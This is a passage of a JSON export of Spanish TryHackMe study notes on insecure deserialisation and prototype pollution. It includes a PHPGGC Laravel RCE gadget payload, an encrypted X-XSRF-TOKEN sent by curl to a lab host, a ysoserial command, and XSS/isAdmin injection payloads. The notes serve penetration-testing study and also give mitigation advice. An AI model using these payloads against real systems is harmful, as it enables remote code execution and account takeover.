    "content": "Automatizar scripts durante el pentesting es esencial para identificar y explotar de manera eficiente las vulnerabilidades en aplicaciones web. En esta tarea exploraremos una herramienta llamada **PHP Gadge Chain (PHPGGC)** que juega un rol crucial en este proceso, automatizando el descubrimiento de vulnerabilidades de deserializaci√≥n insegura.\n\n--------------------------------------------------\n<h2>PHP Gadget Chain (PHPGGC)</h2>\nPHPGGC es una herramienta para generar cadenas de gadget usadas en los ataques de inyecci√≥n de objetos PHP, espec√≠ficamente dise√±ados para explotar vulnerabilidades relacionadas a la serializaci√≥n y deserializaci√≥n de objetos PHP.\n\n<h4>Funcionalidad</h4>\n- **Gadget Chains:** PHPGGC ofrece una librer√≠a de cadenas de gadget para varios frameworks y librer√≠as PHP. Estas cadenas de gadgets son secuencias de objetos y m√©todos dise√±ados para explotar vulnerabilidades espec√≠ficas cuando una aplicaci√≥n PHP deserializa de forma insegura el input del usuario.\n- **Payload Generation:** El prop√≥sito principal de PHPGGC es facilitar la generaci√≥n de payloads serializados que pueden disparar estas vulnerabilidades. Ayuda a investigadores de ciberseguridad y pentesters a crear payloads que demuestren el impacto de las debilidades de deserializaci√≥n.\n- **Payload Customisation:** Los usuarios pueden personalizar payloads especificando argumentos para funciones o m√©todos involucrados en la cadena de gadgets, dirigiendo as√≠ el ataque para conseguir resultados espec√≠ficos.\n\nPuedes descargar PHPGGC desde su [repositorio de GitHub](https://github.com/ambionics/phpggc). Para listar todas las cadenas de gadgets disponibles puedes usar la opci√≥n `-l` con PHPGGC, lo que mostrar√° el nombre, versi√≥n tipo y vector para lanzar un ataque espec√≠fico. Adem√°s, puedes filtrar cadenas de gadgets basado en sus capacidades, como aquellos que apuntan a frameworks PHP o t√©cnicas espec√≠ficos. Para hacer esto usa `-l` seguido de una palabra filtradora.\n\n```bash\nthm@machine$ php phpggc -l\n\nGadget Chains\n-------------\n\nNAME                                      VERSION                                                 TYPE                      VECTOR          I    \nBitrix/RCE1                               17.x.x <= 22.0.300                                      RCE: Command              __destruct           \nCakePHP/RCE1                              ? <= 3.9.6                                              RCE: Command              __destruct           \nCakePHP/RCE2                              ? <= 4.2.3                                              RCE: Command              __destruct           \nCodeIgniter4/FD1                          <= 4.3.6                                                File delete               __destruct           \nCodeIgniter4/FD2                          <= 4.3.7                                                File delete               __destruct           \nCodeIgniter4/FR1                          4.0.0 <= 4.3.6                                          File read                 __toString      *    \nCodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           \nCodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                     RCE: Command              __destruct           \nCodeIgniter4/RCE3                         4.0.4 <= 4.4.3                                          RCE: Command              __destruct           \nCodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                              RCE: Command              __destruct         \n```\n\nPor ejemplo, el output para `CakePHP/RCE1` significa que la cadena de gadget llamada `CakePHP/RCE1` explota una vulnerabilidad RCE en CakePHP en versiones hasta la `3.9.6`. Esta vulnerabilidad permite a los atacantes ejecutar comandos en el sercidor aprovech√°ndose del m√©todo `__destruct`.\n\n------------------------------------------\n<h2>Explotar una Aplicaci√≥n Web</h2>\nComo pentesters, nos centramos en una web para explotar una vulnerabilidad conocida identificada bajo [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133). La vulnerabilidad es disparada cuando Laravel deserializa la informaci√≥n no confiable del `X-XSRF-TOKEN`. El proceso de deserializaci√≥n puede llevar a ejecutar c√≥digo arbitrario en el servidor si no se maneja con cautela. Los detalles em cuando a esta vulnerabilidad pueden leerse [aqu√≠](https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30), pero nuestro foco principal ser√° c√≥mo podemos utilizar las cadenas de gadgets PHP durante la explotaci√≥n. La vulnerabilidad arriba mencionada puede ser explotada usando 3 factores principales:\n\n- **Paso 1:** Requiere `APP_KEY` de Laravel, el cual el framework usa para encriptar el token XSRF.\n- **Paso 2:** Usa PHPGGC para generar un payload deserializado ejecutando un comando. Esto se considera una tarea compleja por lo que hay una herramienta que nos ayuda.\n- **Paso 3:** Finalmente, debemos encriptar el payload usando `APPKEY` y mandar la petici√≥n POST. Esto normalmente var√≠a de un framework a otro.\n\nEn esta tarea nuestro foco principal estar√° en el paso 2 y en entender c√≥mo PHPGGC nos asistir√°. Visita la aplicaci√≥n vulnerable de Laravel en `http://IP:8089`. Podemos identificar las versiones de la aplicaci√≥n mediante diferentes t√©cnicas. La versi√≥n de este Laravel es la `5.6.29`.\n\n![[Pasted image 20260121125547.png]]\n\nAhora iremos al paso a paso detallado de la explotaci√≥n.\n\n- Para el primer paso, adquiriremos `APP_KEY` mediante un vector de ataque como ingenier√≠a social. Puedes obtenerla en este ejemplo visitando `http://IP:8089/get-key`. Adem√°s esta p√°gina te dar√° el primer payload que tiene el comando `whoami`.\n- Para el segundo paso tenemos que identificar el payload que podemos usar:\n\n```bash\nthm@machine$ php phpggc -l Laravel\n\nGadget Chains\n-------------\n\nNAME                  VERSION           TYPE             VECTOR    \nLaravel/RCE1          5.4.27            rce              __destruct\nLaravel/RCE2          5.5.39            rce              __destruct\nLaravel/RCE3          5.5.39            rce              __destruct\nLaravel/RCE4          5.5.39            rce              __destruct\n```\n\nPodemos generar el payload usando varios gadgets. Cada gadget tiene su relevancia y utiliza diferentes clases durante el proceso de deserializaci√≥n. Usaremos RCE3 en este ejemplo y generaremos el payload usando el comando `php phpggc -b Laravel/RCE3 system whoami` para un payload base64 encodeado. Aqu√≠ abajo se muestra un payload no encodeado:\n\n```bash\nthm@machine$ php phpggc Laravel/RCE3 system whoami \nO:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"*events\";O:39:\"Illuminate\\Notifications\\ChannelManager\":3:{s:6:\"*app\";s:6:\"whoami\";s:17:\"*defaultChannel\";s:1:\"x\";s:17:\"*customCreators\";a:1:{s:1:\"x\";s:6:\"assert\";}}}\n```\n\n<h4>Desglose del Payload</h4>\n- `Illuminate\\Broadcasting\\PendingBroadcast`: Esta clase maneja eventos broadcast en Laravel. Es principalmente un veh√≠culo para llevar el objeto malicioso anidado.\n- `Illuminate\\Notifications\\ChannelManager`: Este objeto maneja los canales de notificaci√≥n. Lo manipulamos para inyectar ejecuci√≥n de c√≥digo arbitrario a trav√©s de sus propiedades, `*app`, la cual t√≠picamente referenciar√≠a el contenedor de servicio de la aplicaci√≥n.Lo usamos mal intencionalmente para que acoja nuestro comando `whoami`. Tambi√©n manipulamos las propiedades `*defaultChannel` y `*customCreators` que est√°n giradas para crear un escenario donde la funci√≥n `assert` de PHP se llame, ejecutando el c√≥digo pasado.\n\nComo ya sabemos, Laraver emple√≥ intencionalmente cookies encriptadas y serializadas para guardar de forma segura la informaci√≥n de sesi√≥n y token CSRF, usando la misma metodolog√≠a para ambos. Si visitamos la app vulnerable, podemos ver las cookies encriptadas y serializadas.\n\n![[Pasted image 20260121130737.png]]\n\nLa idea b√°sica es evitar la manipulaci√≥n de informaci√≥n por parte de agentes maliciosos, pero no se dieron cuenta de que incluso un mecanismo de seguridad tan fuerte podr√≠a ser roto a trav√©s de serializaci√≥n insegura.\n\nAhora que tenemos `APP_KEY` y el payload, es hora de crear un token CSRF encriptado. Para eso hemos preparado un script de PHP que toma la `APP_KEY` y el payload como argumentos y devuelve el token encriptado. Puedes acceder en el link [http://IP:8089/cve.php?app_key=xx&payload=xxx](http://IP:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0%3D). Para tu conveniencia, esta URL ya tiene la clave encodeada y el primer payload \"**whoami**\" incrustados.\n\nCuando pentesteamos frameworks web como Yii, CakePHP y Laravel, es esencial entender que cada framework tiene unos mecanismos de routing y encriptaci√≥n √∫nicos aunque se construyan todos en PHP. Estos frameworks se dise√±an con diferentes arquitecturas e implementaciones de seguridad. Esto significa que ataques espec√≠ficamente dirigidos hacia un framework no tienen por qu√© funcionar en otro.\n\nAhora que tenemos el token encriptado, podemos hacer una petici√≥n POST usando el token CSRF como se muestra debajo.\n\n```bash\nthm@machine$curl 10.66.163.248:8089 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ=='| head -n 2\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  7245    0  7245    0     0  73181      0 --:--xxxx--:--:-- --:--:--     0\n<!DOCTYPE html><!--\n100 14485    0 14485    0     0   141k      0 --:--:-- --:--:-- --:--:--  140k\ncurl: (23) Failed writing body (947 != 7240)\n```\n\n----------------------------------------------\n<h2>Ysoserial para Java</h2>Ysoserial es una herramienta de explotaci√≥n ampliamente reconocida especialmente constru√≠da para comprobar la seguridad de aplicaciones Java contra vulnerabilidades de serializaci√≥n. Ayuda a generar payloads que exploten estas vulnerabilidades.\n\nPara usar Ysoserial, un ataccante deberia generar un payload con el comando `java -jar ysoserial.jar [tipo de payload] '[comando a ejecutar]'`. Por ejemplo, usando el tipo de payload `CommonsCollections1`: `java -jar ysoserial.jar CommonsCollections1 'calc.exe'`. Este comando genera un objeto serializado que ejecutar√° el comando especificado al ser deserializado. Puedes descargar Ysoserial en [Github](https://github.com/frohoff/ysoserial).",
    "modified": "2026-01-23T00:56:08"
  },
  {
    "title": "2. Some Important Concepts",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/2-some-important-concepts/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/2. Some Important Concepts.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Antes de hablar sobre deserializaci√≥n insegura en detalle, es crucial entender el concepto b√°sico.\n\n----------------------------------------\n<h2>Serializaci√≥n</h2>\nPiensa en la serializaci√≥n como preparar tu mochila por la ma√±ana. Tienes libros, cuadernos, botella de agua y tienes que organizarlo en tu mochila. La seriializaci√≥n es coger diferentes piezas de informaci√≥n y ponerlas juntas para hacer que sean f√°ciles de guardar o mandar.\n\n![[Pasted image 20260119113302.png]]\n\nEn programaci√≥n, la serializaci√≥n es el proceso de transformar el estado de un objeto en formato legible por humanos o binario que puede ser guardado o transmitido y reconstru√≠do cuando se requiera. Esta capacidad es esencial en aplicaciones donde la informaci√≥n debe ser transferida entre partes diferentes de un sistema o a trav√©s de la red. En PHP este proceso lo realiza la funci√≥n `serialize()`.\n\n<h4>Ejemplo</h4>\n```php\n<?php\n$noteArray = array(\"title\" => \"My THM Note\", \"content\" => \"Welcome to THM!\");\n$serialisedNote = serialize($noteArray);  // Converting the note into a storable format\nfile_put_contents('note.txt', $serialisedNote);  // Saving the serialised note to a file\n?>\n```\n\nEl siguiente output muestra la string serializada en el archivo `note.txt`, el cual incluye detalles de la estructura y contenido de la nota.\n\n**Serialised Note**: `a:2:{s:5:\"title\";s:12:\"My THM Note\";s:7:\"content\";s:12:\"Welcome to THM!\";}`\n\n-----------------------------------------------\n<h2>Deserializaci√≥n</h2>\nImagina que llegas a la escuela y necesitas lo que has guardado en la mochila esta ma√±ana. La deserializaci√≥n es como desempaqueta tu mochila cuando llegas a clase. La deserializaci√≥n es el proceso de convertir la informaci√≥n formateada de vuelta en un objeto. Es crucial para recuperar informaci√≥n de archivos, bases de datos o a trav√©s de la red.\n\n![[Pasted image 20260119113938.png]]\n\nSiguiendo el anterior ejemplo, aqu√≠ est√° c√≥mo deserializar√≠amos la nota en PHP:\n\n```php\n<?php\n$serialisedNote = file_get_contents('note.txt');  // Reading the serialised note from the file\n$noteArray = unserialize($serialisedNote);  // Converting the serialised string back into a PHP array\necho \"Title: \" . $noteArray['title'] . \"<br>\";\necho \"Content: \" . $noteArray['content'];\n?>\n```\n\nEste c√≥digo lee la nota serializada de un archivo y la convierte de vuelta en un array, reconstruyendo la nota original.\n\n-------------------------------------------------\n<h2>Incidentes Espec√≠ficos que Involucran Vulnerabilidades de Serializaci√≥n</h2>\nHablemos de incidentes espec√≠ficos donde las vulnerabilidades de serializaci√≥n jugaron un rol cr√≠tico en las brechas de ciberseguridad.\n\n<h4>Log4j Vulnerability CVE-2021-44228</h4>\n- **Incidente:** La [vulnerabilidad Log4j](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), o Log4Shell, es una debilidad de seguridad cr√≠tica encontrada en la librer√≠a Log4j de Apache2, usada ampliamente en aplicaciones Java. Esta vulnerabilidad permite a los atacantes ejecutar c√≥digo arbitrario en los sistemas afectados explotando la funcionalidad de deserializaci√≥n insegura de la librer√≠a.\n- **Impacto:** El hecho de permitir a los atacantes ejecutar c√≥digo arbitrario hizo que los atacantes pudieran comprometer infraestructura cr√≠tica, llevando a acceso no autorizado, disrupci√≥n del servicio y ataques de cadena de suministro.\n\n<h4>WebLogic Server Remote Code Execution CVE-2015-4852</h4>\n- **Incidente:** Esta vulnerabilidad estaba relacionada con c√≥mo el [Servidor WebLogic de Oracle](https://www.oracle.com/security-alerts/alert-cve-2015-4852.html) mandaba la informaci√≥n al protocolo T3. Los atacantes pod√≠an mandar objetos maliciosos al servidor, que al deserializarlo llevaba a RCE.\n- **Impacto:** Esta vulnerabilidad fue ampliamente explotada para ganar acceso no autorizado a sistemas, desplegar ransomware o robar informaci√±on. Afect√≥ a las versiones de WebLogic server que no deshabilit√≥ el servicio vulnerable o pparche√≥ el problema.\n\n<h4>Jenkins Java Deserialisation CVE-2016-0792</h4>\n- **Incidente:** [Jenkins](https://www.tenable.com/plugins/nessus/89034) es un servidor de automatizaci√≥n popular usado en el desarrollo de software. Experiment√≥ una vulnerabilidad cr√≠tica que involucraba la deserializaci√≥n Java. Los atacantes pod√≠an mandar payloads serializados a Jenkins CLI, la cual al deserializar permit√≠a RCE.\n- **Impacto:** Permiti√≥ a atacantes ejecutar comandos de shell, potencialmente tomando posesi√≥n del servidor Jenkins.",
    "modified": "2026-01-20T00:54:21"
  },
  {
    "title": "0. Insecure Deserialisation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/0-insecure-deserialisation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/0. Insecure Deserialisation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/1. Introduction]]\n[[2. Some Important Concepts]]\n[[3. Serialisation Formats]]\n[[4. Identification]]\n[[5. Exploitation - Update Properties]]\n[[6. Exploitation - Object Injection]]\n[[7. Automation Scripts]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/8. Mitigation Measures]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Exploitation - XSS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/4-exploitation-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/4. Exploitation - XSS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "<h2>Acercamiento Est√°ndar</h2>\nComo ya sabemos, numerosas propiedades est√°n presentes de forma heredada en el prototipo de un objeto en JavaScript. Entre estas, las propiedades `constructor` y `__proto__` destacan como objetivos de explotaci√≥n. La propiedad `constructor` apunta a la funci√≥n que construye el prototipo del objeto, mientras que `__proto__` es una referencia al objeto prototipo del que actualmente el objeto hereda directamente.\n\n--------------------------------\n<h2>Regla de Oro</h2>\nEl concepto orbita entorno a la habilidad del atacante para influenciar ciertos par√°metros clave, como `x` y `val`, en expresiones similares a `Person[x][y] = val`. Sup√≥n que un atacante asigna `__proto__` a `x`. En dicho caso, el atributo identificado por `y`, es configurado universalmente a lo largo de todos los objetos que comparten la misma clase que el objeto con el valor denotado por `val`.\n\nEn un escenario m√°s complejo, cuando un atacante tiene control sobre `x`, `y` y `val` en una estructura como `Person[x][y][z] = val`, asignar `x` como `constructor` e `y` como `prototype` conlleva a que una nueva propiedad definida por `z` se establezca a lo largo de todos los objetos en la aplicaci√≥n con el `val` asignado. Este acercamiento necesita una organizaci√≥n de las propiedades de un objeto m√°s complejas, haci√©ndolo menos relevante en la pr√°ctica.\n\n----------------------------\n<h2>Algunas Funciones Importantes</h2>\nCuando se trata de identificar vulnerabilidades potenciales de contaminaci√≥n de prototipos, los pentesters deber√≠an enfocarse en vectores/funciones com√∫nmente susceptibles a la contaminaci√≥n de prototipos. Es crucial realizar una investigaci√≥n concienzuda de c√≥mo gestiona la aplicaci√≥n la manipulaci√≥n de objetos. Entenderemos unas cuantas funciones que un atacante puede explotar y entonces realizamos la explotaci√≥n.\n\n- **Property Definition by Path:** Las funciones que configuran propiedades de objetos basadas en una ruta dada (como `object[a][b][c] = value`) pueden ser peligrosas si los componentes de la ruta son controlados por el usuario. Estas funciones deber√≠an ser inspeccionadas para asegurar que no modifican el prototipo de objeto sin avisar. Considera un endpoint que permite a los usuarios actualizar rese√±as sobre cualquier amigo.\n\n<h4>Estructura de Objeto Inicial</h4>\nAntes de ninguna actualizaci√≥n, tenemos un array `friends` inicial que contiene un objeto que representa el perfil de un amigo. Cada perfil incluye propiedades como `id`, `name`, `reviews` y `albums`.\n\n```javascript\nlet friends = [ { id: 1, name: \"testuser\", age: 25, country: \"UK\", reviews: [], albums: [{ }], password: \"xxx\", } ]; _.set(friend, input.path, input.value);\n```\n\n<h4>Input Recibido del Usuario</h4>\nEl usuario quiere a√±adir una review a su amigo. Ofrecen un payload que contiene la ruta donde la review deber√≠a ser a√±adida (`review.content`) y el contenido de la review (`<script>alert(anycontent</script>`) .\n\nUn atacante actualiza al ruta para apuntar al prototipo:\n\n```javascript\n{ \"path\": \"reviews[0].content\", \"value\": \"&#60;script&#62;alert('anycontent')&#60;/script&#62;\" };\n```\n\nUsamos la funci√≥n `_set` de lodash para aplicar el payload y a√±adir el contenido de la review a la ruta especificada en el objeto del perfil del amigo.\n\n<h4>Estructura de Objeto Resultante</h4>\nDespu√©s de ejecutar el c√≥digo, el array `friends` ser√° modificado para incluir la review del usuario. Sin embargo, debido a la falta de correcta validaci√≥n, el contenido de la review dado por el usuario (`<script>alert('anycontent')</script>`) fue directamente a√±adido al objeto de perfil sin la sanitizaci√≥n adecuada.\n\n```javascript\nlet friends = [\n  {\n    id: 1,\n    name: \"testuser\",\n    age: 25,\n    country: \"UK\",\n    reviews: [\n      \"<script>alert('anycontent')</script>\"\n    ],\n    albums: [{}],\n    password: \"xxx\",\n  }\n];\n```\n\nDe forma similar, sup√≥n que el atacante quiere insertar una propiedad maliciosa en el perfil del amigo. En dicho caso, ofrecen un payload que contiene la ruta donde la propiedad deber√≠a ser a√±adida (`isAdmin`) y el valor de la propiedad maliciosa (`true`).\n\n```javascript\nconst payload = { \"path\": \"isAdmin\", \"value\": true };\n```\n\nDespu√©s de ejecutar el c√≥digo, el array `friends` ser√° modificado para incluir la propiedad maliciosa `isAdmin` en el objeto del perfil del amigo. El objeto `friends` tendr√° la siguiente estructura:\n\n```javascript\nlet friends = [\n  {\n    id: 1,\n    name: \"testuser\",\n    age: 25,\n    country: \"UK\",\n    reviews: [],\n    albums: [],\n    password: \"xxx\",\n    isAdmin: true // Malicious property inserted by the attacker\n  }\n];\n```\n\n-----------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\nAhora veremos de forma pr√°ctica c√≥mo los atacantes pueden explotar esta vulnerabilidad. Sup√≥n que est√°s trabajando como pentester en una firma encargado de auditar una plataforma de red social. Puedes acceder a la aplicaci√≥n en `http://IP:5000` con las siguientes credenciales:\n\n- Username: `bob`\n- Password: `bob@123`\n\nDespu√©s de iniciar sesi√≥n, ver√°s un dashboard as√≠:\n\n![[Pasted image 20260205105243.png]]\n\nPara identificar la prototype pollution, exploraremos diferentes funcionalidades de la aplicaci√≥n, como a√±adir √°lbumes, mandar solicitudes de amistad, a√±adir reviews, etc. Una vez que hayas iniciado sesi√≥n, otros amigos pueden ser a√±adidos a tu lista de amigos. Visita el perfil de cualquier amigo (digamos Sabalenka en este caso). Una vez que visites la p√°gina, ver√°s diferentes opciones como a√±adir una opini√≥n, clonar un √°lbum, etc.\n\nExploremos la funcionalidad de subida.\n\n![[Pasted image 20260205105510.png]]\n\nLa funcionalidad de subida de opiniones permite a los usuarios subir cualquier review, la cual ser√° guardada en la base de datos. Exploremos el lado del cliente y el del servidor para analizar varias posibilidades de explotaci√≥n.\n\n```html\n<form action=\"/submit-friend-review\" method=\"post\" class=\"mb-4\">\n    <h2 class=\"mb-3\">Submit a Review</h2>\n    <input type=\"hidden\" name=\"friendId\" value=\"1\">\n    <div class=\"form-group\">\n        <textarea class=\"form-control\" name=\"reviewContent\" placeholder=\"Write your review here\" rows=\"3\"></textarea>\n    </div>\n    <button type=\"submit\" class=\"btn btn-primary\">Submit Review</button>\n</form>\n```\n\nEl c√≥digo del lado del cliente toma la review como par√°metro de input y llama al endpoint API `/submit-friend-review` para a√±adir y revisar junto con el par√°metro oculto `friendId`. COmo vimos en tareas previas, la contaminaci√≥n de prototipo s√≥la es raramente explotable. Sin embargo, cuando es combinada con otros vectores de ataque como XSS, puede ofrecer una superficie de ataque mayor.\n\nVeamos ahora el c√≥digo del lado del servidor.\n\n```javascript\nlet friends = [\n  {\n    id: 1,\n    name: \"Sabalenka\",\n    age: 25,\n    country: \"UK\",\n    reviews: [],\n    albums: [{ name: \"USA Trip\", photos: \"git.thm\" }],\n    password: \"xxx\",\n  },\n...\n...\napp.post(\"/submit-friend-review\", (req, res) => {\n  if (!req.session.user) {\n    return res.redirect(\"/signin\");\n  }\n  const { friendId, reviewContent } = req.body;\n  const friend = friends.find((f) => f.id === parseInt(friendId));\n  if (!friend) {\n    return res.status(404).send(\"Friend not found\");\n  }\n  try {\n    const input = JSON.parse(reviewContent);\n    _.set(friend, input.path, payload.value);\n  } catch (e) { }\n  res.redirect(`/friend/${friendId}`);\n});\n```\n\nEste c√≥digo realiza las siguientes acciones:\n\n- Primero, valida si el usuario ha iniciado sesi√≥n. Si no, lo redirige a la p√°gina de login.\n- Entonces, el c√≥digo extrae el par√°metro y valida la conexi√≥n entre el usuario con sesi√≥n iniciada y el `friendId` recibido como par√°metro de petici√≥n.\n- Despu√©s de verificar la conexi√≥n del amigo, el c√≥digo inserta la review en el objeto amigo.\n- El c√≥digo usa la funci√≥n `_.set` de la utilidad Lodash que permite configurar el valor de una propiedad en una ruta dada. Es una forma conveniente de configurar valores en objetos sin tener que comprobar si cada nivel de ruta existe. Si una porci√≥n no existe, `_set` la crea.\n- El an√°lisis del c√≥digo muestra que es una buena oportunidad para realizar el ataque de definici√≥n de propiedad mediante ruta.\n- Siguiendo, a√±adiremos una amigo y visitaremos su perfil para a√±adir una simple review y ver si funciona.\n\n![[Pasted image 20260205111105.png]]\n\n- La review es a√±adida exitosamente. Basado en el conocimiento que obtenemos del c√≥digo fuente, preparemos un payload para mandar a la review que disparar√° una alerta. Sabemos que el objeto `friends` tiene un array `reviews` donde las reviews de cada usuario se guardan. La funcionalidad para a√±adir una review funciona s√≥lo en el perfil de un amigo.\n\n```javascript\n{\"path\": \"reviews[0].content\", \"value\": \"<script>alert('Hacked')</script>\"}\n```\n\n![[Pasted image 20260205111348.png]]\n\nAhora, cada vez que alguien visite el perfil de este usuario, el ataque XSS seguir√° ocurriendo. En dichos escenarios, el atacante puede incluso manipular otras propiedades que pueden permitir acceso admin al usuario, como `isAdmin`, `isLoggedIn`, etc.\n\nEn esta tarea, hemos aprendido c√≥mo el atacante puede lanzar ataques de prototype pollution y XSS usando la t√©cnica de propiedad por definici√≥n.",
    "modified": "2026-02-06T01:03:26"
  },
  {
    "title": "8. Mitigation Measures",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/8-mitigation-measures/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/8. Mitigation Measures.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "Mitigar los riesgos asociados con la contaminaci√≥n de prototipos es crucial tanto para los pentesters como para los desarrolladores. Aqu√≠ algunas medidas de mitigaci√≥n para:\n\n-----------------------------------------------\n<h2>Pentesters</h2>\n- **Manipulaci√≥n y Fuzzeo de Input:** Interact√∫a con el input del usuario y fuzz√©alos con una variedad de payloads. Busca escenarios donde informaci√≥n no confiable pueda llevar a PP.\n- **An√°lisis de Contexto e Inyecci√≥n de Payloads:** Analiza el c√≥digo de la aplicaci√≥n para entender c√≥mo el input del usuario se usa en las estructuras. Inyecta payloads en estos contextos para comprobar vulnerabilidades de PP.\n- **Bypasseo CSP e Inyecci√≥n de Payloads:** Eval√∫a la efectividad de los headers de seguridad como CSP (Cloud Service Provider). Intenta bypassear las restricciones del CSP e inyecta payloads para manipular prototipos.\n- **An√°lisis y Explotaci√≥n de Dependencias:** Realiza un an√°lisis exhaustivo de librer√≠as de terceros y dependencias usadas por la aplicaci√≥n. Identifica librer√≠as anticuadas que puedan introducir vulnerabilidades PP y expl√≥talas.\n- **An√°lisis Est√°tico de C√≥digo:** Usa herramientas de an√°lisis de c√≥digo est√°tico para identificar vulnerabilidades durante la fase de desarrollo.\n\n----------------------------------------\n<h2>Secure Code Developers</h2>\n- **Evitar Usar __proto__:** Restringe el uso de `__proto__` en la medida de lo posible ya que es susceptible de PP. En su lugar usa `Object.getPrototypeOf()` para acceder al prototipo de un objeto de forma m√°s segura.\n- **Objetos Inmutables:** Dise√±a objetos inmutables cuando sea posible. Este previene modificaciones no intencionadas del prototipo.\n- **Encapsulaci√≥n:** Encapsula objetos y sus funcionalidades, exponiendo s√≥lo interfaces necesarias.\n- **Usar Valores por Defecto Seguros:** Al crear objetos, establece valores seguros por defecto y evita confiar en el input del usuario para configurar propiedades del prototipo.\n- **Sanitizar el Input:** Sanitiza y valida el input del usuario exhaustivamente.\n- **Gesti√≥n de Dependencias:** Actualiza y monitoriza regularmente las dependencias. Elige librer√≠as no deprecadas.\n- **Headers de Seguridad:** Implementa headers de seguridad como CSP (Content Security Policy) para controlar las fuentes desde las cuales se cargan.",
    "modified": "2026-02-09T01:09:24"
  },
  {
    "title": "0. Prototype Pollution",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/0-prototype-pollution/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/0. Prototype Pollution.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/1. Introduction]]\n[[2. Essential Recap]]\n[[3. How it Works]]\n[[4. Exploitation - XSS]]\n[[5. Exploitation - Property Injection]]\n[[6. Exploitation - Denial of Service]]\n[[7. Automating the Process]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/8. Mitigation Measures]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
